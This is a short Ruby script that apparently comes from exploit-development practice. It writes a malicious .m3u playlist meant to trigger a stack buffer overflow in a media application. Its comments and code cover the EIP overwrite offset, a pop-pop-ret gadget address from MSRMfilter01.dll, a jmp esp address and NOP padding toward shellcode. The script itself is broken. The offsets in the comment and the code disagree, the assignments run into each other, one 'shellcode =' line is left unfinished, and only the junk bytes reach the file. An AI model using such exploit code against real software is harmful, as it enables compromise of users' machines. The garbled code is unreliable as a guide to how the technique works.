#!/usr/bin/env ruby

=begin 
We know that we need 26094 bytes before overwriting EIP, and that we need 4 more bytes before we are at the stack address
where ESP points at (in my case, this is 0x000ff730). We will simulate that at ESP+8, we have an address that points to the 
shellcode. (in fact, we’ll just put the shellcode behind it – again, this is just a testcase). 26094 A’s, 4 XXXX’s 
(to end up where ESP points at), then a break, 7 NOP’s, a break, and more NOP’s. Let’s pretend the shellcode begins at the
second break. The goal is to make a jump over the first break, straight to the second break which is at ESP+8 bytes = "0x000FFD38".

To get the value of ESP+8 into EIP (and to craft this value so it jumps to the shellcode) I will use the pop ret technique + 
address of jmp esp !!!

=end

begin

file = "pop_ret.m3u"

x            = "A" * 26064                  +   # misc junk
eip          = [0x01b56a10].pack('V')       +   # pop pop ret from MSRMfilter01.dll
jmp_esp      = [0x01CCF23A].pack('V')       +   # jmp esp
append_esp   = "XXXX"                       +   # add 4 bytes so ESP points to the beginning of our shellcode | 000FFD34 58585858 XXXX
shellcode    = "\x90" * 8                   +   # add 8 more bytes
shellcode    += shellcode + jmp_esp         +   # address to return via pop pop ret ( = jmp esp )
shellcode    = 

  textfile = open(file , 'w')
  textfile.write(x)
  textfile.close()

  puts
  puts " pop_ret.m3u file created!\n\n\n"

end